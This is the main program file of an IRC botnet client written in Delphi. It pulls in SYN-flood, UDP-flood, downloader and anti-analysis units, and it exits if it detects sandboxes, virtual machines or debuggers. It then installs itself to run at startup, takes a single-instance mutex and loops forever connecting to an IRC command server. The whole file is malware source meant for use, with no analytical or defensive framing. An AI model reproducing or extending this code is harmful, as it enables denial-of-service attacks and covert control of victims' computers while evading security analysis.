program mange;

{%File 'Settings.ini'}


uses
  Windows,
  ShellAPI,
  commctrl,
  base in 'Units\base.pas',
  commands in 'Units\commands.pas',
  Functions in 'Units\Functions.pas',
  dlupdate in 'Units\dlupdate.pas',
  antis in 'Units\antis.pas',
  miscfunctions in 'Units\miscfunctions.pas',
  variables in 'Units\variables.pas',
  synflood in 'Units\synflood.pas',
  udpflood in 'Units\udpflood.pas',
  seeder in 'Units\seeder.pas';

//<< looks like injection was removed ;)

Procedure DecryptSettings();
begin
channel := server_channel;
DNS := server_address;
installname := bot_installname;
channelkey := server_channelkey;
end;

begin

  {$IFNDEF DEBUG}
  if Sandboxie = true then ExitProcess(0);
  if IsInVPC = true then ExitProcess(0);
  if InVMware = true then ExitProcess(0);
  if InVirtualBox = true then ExitProcess(0);
  if ThreadExpert = true then ExitProcess(0);
  if CWSandbox = true then ExitProcess(0);
  if JoeBox = true then ExitProcess(0);
  if NormanSandBox = true then ExitProcess(0);
  if IsSoftIce = true then ExitProcess(0);
  if IsInDebugger = true then ExitProcess(0);
  if IsODBGLoaded = true then ExitProcess(0);
  if SyserDebugger = true then ExitProcess(0);
  {$ENDIF}

  DecryptSettings();
  Startup(installname);

  CreateMutex(nil, false, pchar(bot_mutexname));
  if GetLastError = ERROR_ALREADY_EXISTS then begin
    exitprocess(0);
  end;

  mainIRC := TIRCSocket.Create;
  Repeat
    mainIRC.Initialize;
    Sleep(60000);
  Until 1=2;


end.
